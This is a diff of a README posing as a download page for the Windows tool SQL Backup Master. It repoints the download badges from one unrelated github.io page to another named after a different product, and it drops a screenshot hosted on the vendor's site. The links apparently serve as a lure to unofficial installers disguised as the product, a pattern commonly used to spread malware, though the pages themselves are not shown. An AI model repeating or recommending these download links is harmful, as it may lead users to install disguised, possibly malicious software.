@@ -4,7 +4,7 @@
 
 ## 📥 Download SQL Backup Master for Windows
 
-[![⬇️ Download SQL Backup Master](https://img.shields.io/badge/Download-SQL%20Backup%20Master-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/BackupMaster)
+[![⬇️ Download SQL Backup Master](https://img.shields.io/badge/Download-SQL%20Backup%20Master-blue?style=for-the-badge&logo=windows)](https://shrimpy-desktop-app.github.io/.github/Shrimpy)
 
 ---
 
@@ -30,11 +30,7 @@ With SQL Backup Master, users can manage and automate backups, set retention pol
 
 SQL Backup Master is highly customizable, supporting remote backups and backup to various storage options, such as cloud services and local drives.
 
-[![⬇️ Download SQL Backup Master](https://img.shields.io/badge/Download-SQL%20Backup%20Master-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/BackupMaster)
-
----
-
-![SQL Backup Master Interface](https://www.sqlbackupmaster.com/images/screens/main-v7-dark-blue@2x.png)
+[![⬇️ Download SQL Backup Master](https://img.shields.io/badge/Download-SQL%20Backup%20Master-blue?style=for-the-badge&logo=windows)](https://shrimpy-desktop-app.github.io/.github/Shrimpy)
 
 ---
 
